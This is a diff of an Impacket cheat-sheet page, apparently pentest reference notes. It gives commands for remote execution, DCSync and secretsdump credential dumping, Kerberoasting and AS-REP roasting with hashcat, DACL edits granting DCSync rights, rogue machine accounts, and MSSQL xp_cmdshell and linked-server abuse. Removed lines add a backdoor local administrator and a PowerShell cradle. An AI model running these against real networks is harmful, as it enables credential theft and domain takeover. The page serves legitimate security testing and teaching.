@@ -1,124 +1,457 @@
 ---
 title: "Impacket"
 ---
-Collection of Python scripts for interacting with Windows protocols: covers Kerberos, remote execution, credential dumping, and AD enumeration from Linux.
 
-## Kerberos
+Collection of Python scripts for interacting with Windows protocols from Linux. Covers Kerberos, SMB, remote execution, credential dumping, ACL editing, and AD enumeration. All tools follow a consistent auth model.
 
-```bash wrap
-GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request
-GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP
-getTGT.py $DOMAIN/$USER:$PASSWORD
-getST.py $DOMAIN/$USER:$PASSWORD -spn cifs/target -impersonate admin
-```
+## Auth & Kerberos Setup
+
+Every impacket tool accepts credentials in the same three forms. Set up once, reuse everywhere.
+
+<Tabs>
+  <Tab title="Password">
+    Pass credentials inline: `domain/user:password@target`
+
+    ```bash wrap
+    psexec.py $DOMAIN/$USER:$PASSWORD@$IP
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # -hashes accepts LM:NT — use : prefix for NT-only
+    psexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    Requires a valid ccache and the **hostname**, not IP. Impacket resolves the SPN from the hostname — using an IP will fail with KRB5 errors.
+
+    ```bash wrap
+    # Get a TGT first if you don't have one
+    getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP        # password
+    getTGT.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP # hash
+    getTGT.py $DOMAIN/$USER -aesKey $AESKEY -dc-ip $DC_IP  # AES key
+
+    export KRB5CCNAME=$USER.ccache
+
+    # Then use -k -no-pass with the hostname
+    psexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    ```
+  </Tab>
+</Tabs>
+
+<Info>
+Always use the DC/target **hostname** with `-k`, never the IP. If DNS doesn't resolve, add the host to `/etc/hosts` and point to `$DC_IP`.
+</Info>
 
 ## Remote Execution
 
-Pick based on noise level: psexec is loudest (creates a service), wmiexec is quieter, atexec leaves the least trace.
+Pick based on noise level: psexec creates a service (very loud), wmiexec runs in WMI (quieter), atexec uses the task scheduler (least trace).
 
-```bash wrap
-psexec.py $DOMAIN/$USER:$PASSWORD@$IP
-wmiexec.py $DOMAIN/$USER:$PASSWORD@$IP
-smbexec.py $DOMAIN/$USER:$PASSWORD@$IP
-atexec.py $DOMAIN/$USER:$PASSWORD@$IP "whoami"
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    psexec.py $DOMAIN/$USER:$PASSWORD@$IP          # SYSTEM shell, creates service
+    wmiexec.py $DOMAIN/$USER:$PASSWORD@$IP         # user-level shell, no binary drop
+    smbexec.py $DOMAIN/$USER:$PASSWORD@$IP         # semi-interactive via SMB pipe
+    atexec.py $DOMAIN/$USER:$PASSWORD@$IP "whoami" # single command via task scheduler
+    dcomexec.py $DOMAIN/$USER:$PASSWORD@$IP        # DCOM-based execution (MMC)
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    psexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    wmiexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    smbexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    atexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH "whoami"
+    dcomexec.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    psexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    wmiexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    smbexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    atexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME "whoami"
+    dcomexec.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    ```
+  </Tab>
+</Tabs>
 
 ## Credential Dumping
 
+### secretsdump.py
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Remote: DCSync / dump SAM+LSA
+    secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP
+
+    # Targeted: specific user only
+    secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP -just-dc-user krbtgt
+
+    # All domain hashes
+    secretsdump.py $DOMAIN/$USER:$PASSWORD@$DC_IP -just-dc
+
+    # Offline: parse dumped hive files
+    secretsdump.py -sam sam.bak -system system.bak LOCAL
+    secretsdump.py -ntds ntds.dit -system system.bak LOCAL
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH
+    secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH -just-dc-user krbtgt
+    secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :$NTHASH -just-dc
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    # Hostname required — use the DC FQDN
+    secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST
+    secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST -just-dc-user krbtgt
+    secretsdump.py -k -no-pass $DOMAIN/$USER@$DC_HOST -just-dc
+    ```
+  </Tab>
+</Tabs>
+
+## Kerberos Tooling
+
+### getTGT.py / getST.py / ticketConverter.py
+
 ```bash wrap
-secretsdump.py $DOMAIN/$USER:$PASSWORD@$IP
-secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+# Request TGT — saves to user.ccache
+getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+getTGT.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
+getTGT.py $DOMAIN/$USER -aesKey $AESKEY -dc-ip $DC_IP
+
+# Request service ticket (TGS) — for S4U2Self/S4U2Proxy / RBCD abuse
+getST.py $DOMAIN/$USER:$PASSWORD -spn cifs/$TARGET.$DOMAIN -dc-ip $DC_IP
+getST.py $DOMAIN/$USER -hashes :$NTHASH -spn cifs/$TARGET.$DOMAIN -dc-ip $DC_IP
+
+# Impersonate a user via S4U2Proxy (RBCD / constrained delegation)
+getST.py $DOMAIN/$COMP_NAME$:$COMP_PASS -spn cifs/$TARGET.$DOMAIN \
+  -impersonate Administrator -dc-ip $DC_IP
+export KRB5CCNAME="Administrator@cifs_$TARGET.$DOMAIN@${DOMAIN^^}.ccache"
+
+# Convert kirbi ↔ ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+ticketConverter.py ticket.ccache ticket.kirbi
 ```
+
+### GetUserSPNs.py (Kerberoasting)
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # List Kerberoastable accounts
+    GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+
+    # Request hashes and save
+    GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -outputfile hashes.txt
+
+    # Target a specific account
+    GetUserSPNs.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    GetUserSPNs.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
+    GetUserSPNs.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP -request -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    GetUserSPNs.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
+    GetUserSPNs.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP -request -outputfile hashes.txt
+    ```
+  </Tab>
+</Tabs>
+
+```bash wrap
+# Crack: hashcat mode 13100 (RC4) or 19700 (AES256)
+hashcat -m 13100 hashes.txt ~/tools/wordlists/rockyou
+hashcat -m 19700 hashes.txt ~/tools/wordlists/rockyou
+```
+
+### GetNPUsers.py (AS-REP Roasting)
+
+<Tabs>
+  <Tab title="No Creds (username list)">
+    ```bash wrap
+    # No credentials needed — just a username list
+    GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt \
+      -format hashcat -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="Password">
+    ```bash wrap
+    # With creds: auto-discovers AS-REP roastable accounts
+    GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request \
+      -format hashcat -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    GetNPUsers.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP -request \
+      -format hashcat -outputfile hashes.txt
+    ```
+  </Tab>
+</Tabs>
+
+```bash wrap
+# Crack: hashcat mode 18200
+hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
+```
+
+## smbclient.py
+
+Interactive SMB client. Works like the native smbclient but is part of impacket — useful when the native tool isn't available or you need PTH/Kerberos from Linux.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Interactive shell (lists shares on connect)
+    smbclient.py $DOMAIN/$USER:$PASSWORD@$IP
+
+    # Connect directly to a share
+    smbclient.py $DOMAIN/$USER:$PASSWORD@$IP -share $SHARENAME
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    smbclient.py -hashes :$NTHASH $DOMAIN/$USER@$IP
+    smbclient.py -hashes :$NTHASH $DOMAIN/$USER@$IP -share $SHARENAME
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    smbclient.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    smbclient.py -k -no-pass $DOMAIN/$USER@$HOSTNAME -share $SHARENAME
+    ```
+  </Tab>
+</Tabs>
+
+Inside the interactive shell:
+
+```text wrap
+shares                # list available shares
+use ShareName         # switch to a share
+ls                    # list files
+cd path               # change directory
+get file.txt          # download file
+put local.txt         # upload file
+exit                  # quit
+```
+
+## ACL Editing (dacledit.py)
+
+Read and write DACLs on AD objects. Required for granting DCSync rights, GenericAll, WriteDacl, etc. from Linux.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Read the DACL on an object
+    dacledit.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action read
+
+    # Grant a right (e.g. GenericAll, DCSync, WriteDacl)
+    dacledit.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action write -rights FullControl
+
+    # Grant DCSync rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
+    dacledit.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      -action write -rights DCSync
+
+    # Grant WriteDacl
+    dacledit.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action write -rights WriteOwner
+
+    # Restore a DACL from backup
+    dacledit.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action restore -file dacl_backup.json
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    dacledit.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action read
+
+    dacledit.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      -action write -rights DCSync
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    dacledit.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP \
+      -principal $USER -target $TARGET -action read
+
+    dacledit.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP \
+      -principal $USER -target-dn "DC=$DOMAIN,DC=local" \
+      -action write -rights DCSync
+    ```
+  </Tab>
+</Tabs>
+
+## Computer Accounts (addcomputer.py)
+
+Create machine accounts — prerequisite for RBCD and other attacks when `ms-DS-MachineAccountQuota > 0`.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Add a computer account
+    addcomputer.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
+
+    # Delete a computer account you created
+    addcomputer.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -computer-name 'EVIL$' -delete
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    addcomputer.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP \
+      -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    addcomputer.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP \
+      -computer-name 'EVIL$' -computer-pass 'EvilPass123!'
+    ```
+  </Tab>
+</Tabs>
+
+## Delegation Enumeration (findDelegation.py)
+
+Find all accounts with unconstrained, constrained, or RBCD delegation configured.
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    findDelegation.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    findDelegation.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    findDelegation.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP
+    ```
+  </Tab>
+</Tabs>
 
 ## Enumeration
 
-```bash wrap
-lookupsid.py $DOMAIN/$USER:$PASSWORD@$IP
-samrdump.py $DOMAIN/$USER:$PASSWORD@$IP
-rpcdump.py $IP
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    lookupsid.py $DOMAIN/$USER:$PASSWORD@$IP        # enumerate SIDs / RID brute
+    samrdump.py $DOMAIN/$USER:$PASSWORD@$IP          # list users, groups, shares via SAMR
+    rpcdump.py $IP                                   # dump RPC endpoints (no auth needed)
+    reg.py $DOMAIN/$USER:$PASSWORD@$IP query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    lookupsid.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    samrdump.py $DOMAIN/$USER@$IP -hashes :$NTHASH
+    reg.py $DOMAIN/$USER@$IP -hashes :$NTHASH query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    lookupsid.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    samrdump.py -k -no-pass $DOMAIN/$USER@$HOSTNAME
+    ```
+  </Tab>
+</Tabs>
 
 ## MSSQL (mssqlclient.py)
 
-Interactive MSSQL client. Once connected, type SQL queries directly or use the built-in helpers for xp_cmdshell.
+Interactive MSSQL client. Type SQL directly or use built-in helpers for `xp_cmdshell`.
 
 ### Connecting
 
-```bash wrap
-mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP                        # SQL auth
-mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -windows-auth          # Windows/Kerberos auth (try this first)
-mssqlclient.py $DOMAIN/$USER@$IP -hashes :$HASH -windows-auth     # PTH
-mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -port 1433             # explicit port (default is 1433)
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -windows-auth   # Windows auth (try first)
+    mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP                 # SQL auth
+    mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -port 1433      # explicit port
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    mssqlclient.py $DOMAIN/$USER@$IP -hashes :$NTHASH -windows-auth
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    mssqlclient.py -k -no-pass $DOMAIN/$USER@$HOSTNAME -windows-auth
+    ```
+  </Tab>
+</Tabs>
 
 ### Situational Awareness
-
-Run these immediately after connecting to understand your permissions and what's reachable.
 
 ```sql wrap
 SELECT SYSTEM_USER;                                          -- current login
 SELECT USER_NAME();                                          -- current DB user
-SELECT IS_SRVROLEMEMBER('sysadmin');                         -- 1 = you are sysadmin
-SELECT name FROM master.dbo.sysdatabases;                    -- list all databases
-SELECT name FROM master..syslogins;                          -- list all SQL logins
+SELECT IS_SRVROLEMEMBER('sysadmin');                         -- 1 = sysadmin
+SELECT name FROM master.dbo.sysdatabases;                    -- list databases
+SELECT name FROM master..syslogins;                          -- list SQL logins
 EXEC sp_linkedservers;                                       -- list linked servers
 ```
 
 ### xp_cmdshell
 
-OS command execution via MSSQL. Requires sysadmin or equivalent. mssqlclient.py has built-in helpers that handle enabling/disabling automatically.
-
 ```bash wrap
-# Built-in helpers (preferred)
-enable_xp_cmdshell                                           # enable xp_cmdshell
-xp_cmdshell whoami                                           # run a command
-xp_cmdshell "powershell -enc <b64>"                         # PowerShell cradle
-disable_xp_cmdshell                                          # clean up after
-
-# Manual via SQL (if helpers are unavailable)
+# Built-in helpers (handle enable/disable automatically)
+enable_xp_cmdshell
+xp_cmdshell whoami
+disable_xp_cmdshell
 ```
 
 ```sql wrap
+-- Manual enable
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
-EXEC xp_cmdshell 'net user hacker Pass123! /add';
-EXEC xp_cmdshell 'net localgroup administrators hacker /add';
 ```
 
 ### Impersonation
-
-If you are not sysadmin, check whether your login can impersonate one that is: this is a direct privilege escalation path.
 
 ```sql wrap
 -- Find logins you can impersonate
 SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
 
--- Impersonate a login (e.g. sa)
+-- Impersonate a login
 EXECUTE AS LOGIN = 'sa';
-SELECT IS_SRVROLEMEMBER('sysadmin');                         -- should now return 1
-
--- Revert back
+SELECT IS_SRVROLEMEMBER('sysadmin');    -- should return 1
 REVERT;
 ```
 
 ### Linked Server Abuse
 
-Linked servers let you run queries (and sometimes commands) on other MSSQL instances in the network, potentially with higher privileges.
-
 ```sql wrap
--- Enumerate linked servers and their auth config
 EXEC sp_linkedservers;
-SELECT * FROM sys.servers;
-
--- Run a query on a linked server
 SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT @@version');
-SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT SYSTEM_USER');
 SELECT * FROM OPENQUERY([$LINKED_SERVER], 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
-
--- Execute xp_cmdshell on a linked server (if it has it enabled and you have rights)
 EXEC ('xp_cmdshell ''whoami''') AT [$LINKED_SERVER];
-
--- Chain through multiple hops
-SELECT * FROM OPENQUERY([$HOP1], 'SELECT * FROM OPENQUERY([$HOP2], ''SELECT @@version'')');
 ```
